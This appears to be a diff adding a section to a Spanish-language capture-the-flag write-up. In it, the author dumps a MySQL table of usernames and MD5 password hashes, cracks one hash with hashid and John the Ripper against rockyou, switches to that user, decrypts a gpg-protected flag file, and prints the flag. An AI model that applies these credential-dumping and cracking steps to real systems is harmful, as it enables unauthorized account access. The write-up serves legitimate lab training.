@@ -152,6 +152,145 @@ mysql>
 
 ```
 
+```shell
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| performance_schema |
+| top_secret         |
+| wordpress          |
++--------------------+
+4 rows in set (0.03 sec)
+
+mysql> use top_secret;
+use top_secret;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++----------------------+
+| Tables_in_top_secret |
++----------------------+
+| avengers             |
++----------------------+
+1 row in set (0.00 sec)
+
+mysql> 
+
+```
+
+```shell
+mysql> describe avengers;
+describe avengers;
++----------+--------------+------+-----+---------+----------------+
+| Field    | Type         | Null | Key | Default | Extra          |
++----------+--------------+------+-----+---------+----------------+
+| id       | int          | NO   | PRI | NULL    | auto_increment |
+| name     | varchar(100) | NO   |     | NULL    |                |
+| username | varchar(100) | NO   | UNI | NULL    |                |
+| password | varchar(255) | NO   |     | NULL    |                |
++----------+--------------+------+-----+---------+----------------+
+
+```
+```shell
+mysql> select * from avengers;
+select * from avengers;
++----+--------------+------------+----------------------------------+
+| id | name         | username   | password                         |
++----+--------------+------------+----------------------------------+
+|  1 | Iron Man     | ironman    | cc20f43c8c24dbc0b2539489b113277a |
+|  2 | Thor         | thor       | 077b2e2a02ddb89d4d25dd3b37255939 |
+|  3 | Hulk         | hulk       | ae2498aaff4ba7890d54ab5c91e3ea60 |
+|  4 | Black Widow  | blackwidow | 022e549d06ec8ddecb5d510b048f131d |
+|  5 | Hawkeye      | hawkeye    | d74727c034739e29ad1242b643426bc3 |
+|  6 | Steve Rogers | steve      | 723a44782520fcdfb57daa4eb2af4be5 |
++----+--------------+------------+----------------------------------+
+6 rows in set (0.01 sec)
+
+```
+
+Para saber que tipo de hash es la contraseña de del usuario `steve` ejecutamos el siguiente comando
+
+```shell
+echo "723a44782520fcdfb57daa4eb2af4be5" | hashid
+
+```
+
+obteniendo el siguiente resultado
+
+```shell
+Analyzing '723a44782520fcdfb57daa4eb2af4be5'
+[+] MD2 
+[+] MD5 
+[+] MD4 
+[+] Double MD5 
+[+] LM 
+[+] RIPEMD-128 
+[+] Haval-128 
+[+] Tiger-128 
+[+] Skein-256(128) 
+[+] Skein-512(128) 
+[+] Lotus Notes/Domino 5 
+[+] Skype 
+[+] Snefru-128 
+[+] NTLM 
+[+] Domain Cached Credentials 
+[+] Domain Cached Credentials 2 
+[+] DNSSEC(NSEC3) 
+[+] RAdmin v2.x 
+
+```
+sacamos que se trata de un MD5 y le pasaremos `John the Ripper` para sacar la contraseña 
+
+```shell
+echo "723a44782520fcdfb57daa4eb2af4be5" > hash.txt
+john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+```
+
+obteniendo que la contraseña es `thecaptain`
+
+```shell
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+thecaptain       (?)     
+1g 0:00:00:00 DONE (2025-03-16 00:33) 6.666g/s 5150Kp/s 5150Kc/s 5150KC/s thekidbilly..theadicts1
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+
+```
+
+ahora somos el usuario `steve`
+
+```shell
+steve@reto02:/home$ whoami
+whoami
+stevesteve@reto02:/home$ ls  
+ls
+steve
+steve@reto02:/home$ cd steve
+cd steve
+steve@reto02:~$ ls
+ls
+user.txt.gpg
+steve@reto02:~$ echo "spongebob" | gpg --batch --yes --passphrase-fd 0 --decrypt user.txt.gpg
+<atch --yes --passphrase-fd 0 --decrypt user.txt.gpg
+gpg: AES256.CFB encrypted data
+gpg: encrypted with 1 passphrase
+HACK{nSPWReoeWijd0PYyWO5YWfbNp}
+
+```
+
+**Flag 2:** `HACK{nSPWReoeWijd0PYyWO5YWfbNp}`
+
+
 ### Flag 3
 
 
